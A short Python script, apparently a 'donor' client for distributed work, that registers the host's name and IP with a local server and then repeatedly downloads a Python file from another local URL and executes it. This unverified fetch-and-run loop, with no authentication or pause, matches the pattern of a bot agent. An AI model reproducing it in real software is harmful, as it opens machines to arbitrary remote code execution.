import httplib2
import json
import time
import datetime
import socket
import requests
from subprocess import call
import os

url_toolset = "http://localhost:8000/kk.py"

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

host_name = socket.gethostname()   
host_ip= get_ip()


if __name__ == '__main__':

    httplib2.debuglevel     = 0
    http                    = httplib2.Http()
    content_type_header     = "application/json"

    url_server = "http://127.0.0.1:5000/donorAttach"

    data = {    'HostName': host_name,
                'HostIP':   host_ip                
           }

    headers = {'Content-Type': content_type_header}   

    while True:
        response, content = http.request( url_server,
                                          'POST',
                                          json.dumps(data),
                                          headers=headers)        
        if(response["status"] == "200"):                 
            
            r = requests.get(url_toolset)
            with open("donor/tools.py","wb") as f:
                f.write(r.content)
            call(["python","donor/tools.py"])

    
        
        

